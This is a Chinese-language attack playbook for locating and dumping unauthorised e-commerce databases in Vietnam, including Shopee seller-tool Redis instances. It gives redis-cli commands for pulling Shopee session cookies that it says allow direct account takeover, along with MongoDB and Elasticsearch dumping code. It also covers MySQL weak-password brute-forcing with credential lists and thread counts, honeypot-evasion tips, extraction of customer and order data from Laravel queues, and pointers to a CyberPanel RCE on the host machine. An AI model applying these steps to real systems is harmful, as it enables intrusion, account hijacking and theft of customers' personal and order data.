# 购物/电商实时数据库甄别 + 越南电商目标特征

拖到未授权数据库后，用下面的关键词判断库/集合/Redis key 是否「购物/电商」相关，再决定是否深挖。

## 库名/集合名/Redis key 关键词（英文 + 越南语）

- 电商通用：shop, store, order, cart, product, ecommerce, e-commerce, sale, sales, customer, checkout, payment, invoice, inventory, catalog, commerce, billing, warehouse, pos
- 平台名：shopee, tiki, lazada, sendo, etsy, amazon
- 业务对象：buy, goods, item, basket, seller, buyer, distributor（经销商）
- 越南语：mua_sam/muahang（购物）、gio_hang（购物车）、don_hang（订单）、san_pham（商品）、khach_hang（客户）、ban_hang（销售）、thuong_mai（贸易）、cuahang/cua_hang（商店）

命中任一关键词 → 深挖该库的集合名 + `find_one()` 看字段（name/phone/email/orderId/code/balance）。

## 越南电商平台特征（目标定位）

- **Haravan**：越南电商 SaaS 平台（类 Shopify），托管大量中小店铺。fofa 里大量 `title="Haravan - Không tìm thấy shop"`（店铺不存在页）说明是 Haravan 店铺；真正的库在店铺自建后端，不在 Haravan 主站。
- **Shopee / Tiki / Lazada / Sendo**：越南主流电商，主站库不公开，别打主站；有价值的是围绕它们的**卖家工具/辅助系统**（自建库 + 缓存暴露公网）。
- 购物网站 fofa 查询：`country="VN" && (title="shop" || title="shopping" || title="Shopee" || title="Tiki" || title="Lazada" || title="Sendo")`。

## Shopee 卖家工具 Redis 特征（越南灰产高价值）

Shopee 卖家自动化/刷单工具的 Redis 未授权常直接暴露账号资产，key 特征：

- `phone_shopee:<手机号>` → value 是 JSON：`{"id":..,"phoneNumber":"..","isRegistered":true,"checkedAt":".."}`（Shopee 账号手机号 + 注册状态，实时刷新）
- `shopee_cookies_user_<id>` → value 是数组，含 `cookieType:"SPC_F"/"SPC_ST"` 的 `cookieValue`（Shopee 登录态 cookie，可直接接管账号）
- `user:<id>` → 工具自身用户

拖取命令（redis-cli）：
```bash
redis-cli -h <ip> --no-auth-warning --scan --pattern 'phone_shopee*'
redis-cli -h <ip> --no-auth-warning --scan --pattern 'shopee_cookies*'
redis-cli -h <ip> --no-auth-warning GET 'shopee_cookies_user_1'
```

## MongoDB 未授权探测 + 拖库（速查）

```python
from pymongo import MongoClient
c = MongoClient(ip, port, serverSelectionTimeoutMS=3500, connectTimeoutMS=3500,
                socketTimeoutMS=3500, directConnection=True)
dbs = c.list_database_names()      # 成功 = 未授权；抛 OperationFailure = 需认证
colls = c[db].list_collection_names()
n = c[db][cn].count_documents({})   # 量级
docs = list(c[db][cn].find().limit(8))  # 抽样看字段
```

勒索信号：`READ_ME_TO_RECOVER_YOUR_DATA` 库 = 已被勒索洗过，跳过。

## Elasticsearch 未授权探测（越南命中约 2.4 万）

```bash
curl -s "http://<ip>:9200/_cat/indices?format=json"   # 未授权直接返回索引名数组
```

- 命中率约 3%（越南 2385 扫 66 未授权）。索引名里找购物关键词（paymenthub/order/product/shop…）。
- **蜜罐信号**：索引名是攻击路径（`wp-admin`/`password_change.cgi`/`wls-wsat`/`boafrm`/`graphql`/`actuator`）= WAF/蜜罐在收集攻击 payload，别碰。
- 大量 `read_me` 索引 = 也是勒索残留。

## MySQL 弱口令爆破（越南命中约 8.7 万，最大池）

```python
import pymysql
pymysql.connect(host=ip, port=3306, user=u, password=p, connect_timeout=4, read_timeout=4)
```

- 常见弱口令：root 空 / root / 123456 / password / toor / admin / mysql；admin/admin；mysql/mysql；root/12345678。
- 全量爆破量大，后台跑（`background=true`）+ 100-120 线程，每 IP 只试 6-12 组最可能口令，别前台等。
- 命中后 `SHOW DATABASES` 找购物库；电商订单主库基本都是 MySQL。
- **拉清单端口 pitfall**：fofa 用 `fields=ip,port`，取 `row[0]`(ip) 和 `row[1]`(port) 一起存 `ip:port`；只取 ip 丢端口会让爆破脚本 `ip,port=line.split(":")` 报 ValueError。

## 共享 Redis → Laravel 队列反序列化 → 多平台域名泄露（Etsy/Shopify 代发生态）

越南电商代发平台（Etsy POD / Shopify 代发）常是**同一台母机 + 同一个未授权 Redis** 跑多个平台（同一套 Laravel 代码，改个 title 就上线新平台）。一个未授权 Redis 能反推出整个平台生态：

1. **key 前缀泄露平台域名**：Laravel cache/session key 形如 `<name>_<domain>_database_<name>_<domain>_cache<hash>`，前缀直接带出域名（`etsy_gb-global_net` / `order_bk2t_co` / `shopify_vmmteam_com`）。`redis-cli --scan` 全量扫 key，正则提取前缀 → 平台清单。
2. **Laravel 队列任务反序列化提取订单数据**：队列 key 是 list 类型 `queues:default`（`LLEN` 看量、`LINDEX <q> 0` 取单条）。value 是 JSON，`data.command` 是 PHP 序列化 `O:21:"App\Jobs\ProcessQueue":...`，里面 `action`（`sale-order-detail`/`purchase-detail`/`update-sale-order-shipping`）、`external_id`（Etsy 订单号）、`account_id`（MongoDB ObjectId）、`data.date_created` 全是业务数据。用正则 `external_id.{0,3}s:\d+:"(\d+)"` 批量提取订单号。
3. **session 泄露攻击者痕迹 + 敏感路径**：`PHPREDIS_SESSION:*` / `cache<hash>` 的 value 是 PHP session 序列化，`url → intended` 字段记录访客试图访问的路径（`.env`/`.kube/config`/`.aws/config`/`actuator/env`/`.s3cmd.ini`）——既泄露「别的黑客也在扫这台机器」，又泄露目标敏感文件路径。
4. **stream 是 websocket 消息流**：`wss-btf-stream`/`wss-ftb-stream`（`XLEN` 看量、`XREVRANGE` 取消息）；`laravel_unique_job:*` 只是 Horizon 任务锁（hash，值只有 throughput/runtime），不是 payload。
5. **母机资产扩展**：5+ 平台域名常解析到同一 IP，`nmap` 全端口 + FOFA `ip="X.X.X.X"` 会发现 CyberPanel(8090)/LiteSpeed WebAdmin(7080)/MongoDB(27017)/邮件服务——这些是母机控制面，CyberPanel 有历史 RCE（CVE-2024-51567，新版已补）。

## ES 业务库深挖（Liferay Commerce 电商）

ES 未授权里大部分是 `docker-cluster`/`elasticsearch`（默认名，日志/监控，价值低）。**有价值的是业务 cluster 名**（`production-cluster`/`rta-es`/`liferay-es`/`sport-es-cluster`）。判据：

- `_cluster/health` 未授权 ≠ 索引可读：OpenSearch 可配 `_cluster/health` 公开但 `_cat/indices` 需认证（返回 403 `security_exception`）。别看到 cluster 名就以为能拖索引。
- **Liferay Commerce 索引**：`liferay-<companyId>` 主索引按 `entryClassName` 字段区分实体——`com.liferay.commerce.model.CommerceOrder`(订单)/`CommerceOrderItem`(订单项)/`CommerceShipment`(发货)/`com.liferay.account.model.AccountEntry`(账户)/`com.liferay.portal.kernel.model.User`(用户)/`Address`(地址)。用 `{"query":{"term":{"entryClassName":"..."}}}` 精准抽实体，`_source` 指定字段（`commerceOrderId`/`orderStatus`/`total`/`name`/`emailAddress`/`userGroupRoleNames`）。账户 `type` 分 `supplier`/`person`/`business`，`Buyer`/`Account Supplier` 角色在 `userGroupRoleNames`。
- 索引名 `products`（十几万条）可能是 B2B 工业品目录；`read_me`(1条) = 勒索残留；`<公司>_stg` 几百万条可能是 DMS 文档元数据（`iD`/`name`/`symbolNo`/`issuedBy`/`recipient`）而非客户数据。